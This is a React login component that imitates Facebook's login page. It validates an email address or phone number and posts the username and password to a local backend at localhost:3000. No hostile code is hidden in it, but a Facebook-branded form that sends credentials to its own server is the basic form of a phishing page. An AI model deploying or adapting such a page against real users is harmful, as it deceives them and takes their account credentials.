import React, { useState } from "react";

const FacebookLogin = () => {
  const [identifier, setIdentifier] = useState("");
  const [password, setPassword] = useState("");
  const [error, setError] = useState("");
  const [success, setSuccess] = useState(false);

  const validateInput = (input) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const phoneRegex = /^\+?\d{10,15}$/;
    return emailRegex.test(input) || phoneRegex.test(input);
  };

  const handleSubmit = async (e) => {
    e.preventDefault();

    if (!validateInput(identifier)) {
      setError("Please enter a valid email address or phone number.");
      return;
    }

    const loginData = {
      identifier: identifier.trim(),
      password: password.trim(),
    };

    try {
      const response = await fetch("http://localhost:3000/api/login", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(loginData),
      });

      const result = await response.json();

      if (response.ok) {
        setSuccess(true);
        setError("");
        console.log("Login successful:", result);

        setTimeout(() => window.location.reload(), 2000);
      } else {
        setSuccess(false);
        setError(result.message || "Login failed.");
      }
    } catch (err) {
      console.error("Error:", err);
      setError("Something went wrong. Please try again later.");
    }
  };

  return (
    <div className="min-h-screen bg-blue-100 flex items-center justify-center px-4">
      <div className="bg-white rounded-2xl shadow-lg p-8 w-full max-w-md">
        <h1 className="text-3xl font-bold text-center text-blue-600 mb-6">Facebook</h1>
        <p className="text-center text-gray-700 mb-6">Log in to your account</p>

        {success ? (
          <div className="bg-green-100 border border-green-400 text-green-700 px-4 py-3 rounded text-center mb-4">
            ✅ Login successful! Reloading...
          </div>
        ) : (
          <form className="space-y-4" onSubmit={handleSubmit}>
            <div>
              <input
                type="text"
                placeholder="Email address or phone number"
                value={identifier}
                onChange={(e) => setIdentifier(e.target.value)}
                className={`w-full px-4 py-3 border ${
                  error ? "border-red-500" : "border-gray-300"
                } rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500`}
                required
              />
            </div>

            <div>
              <input
                type="password"
                placeholder="Password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                required
              />
            </div>

            {error && (
              <p className="text-sm text-red-500 -mt-2">{error}</p>
            )}

            <button
              type="submit"
              className="w-full bg-blue-600 hover:bg-blue-700 text-white font-semibold py-3 rounded-lg transition duration-300"
            >
              Log In
            </button>

            <div className="text-center">
              <a href="#" className="text-blue-600 text-sm hover:underline">
                Forgotten password?
              </a>
            </div>

            <hr className="my-4" />

            <button
              type="button"
              className="w-full bg-green-600 hover:bg-green-700 text-white font-semibold py-3 rounded-lg transition duration-300"
            >
              Create New Account
            </button>
          </form>
        )}
      </div>
    </div>
  );
};

export default FacebookLogin;
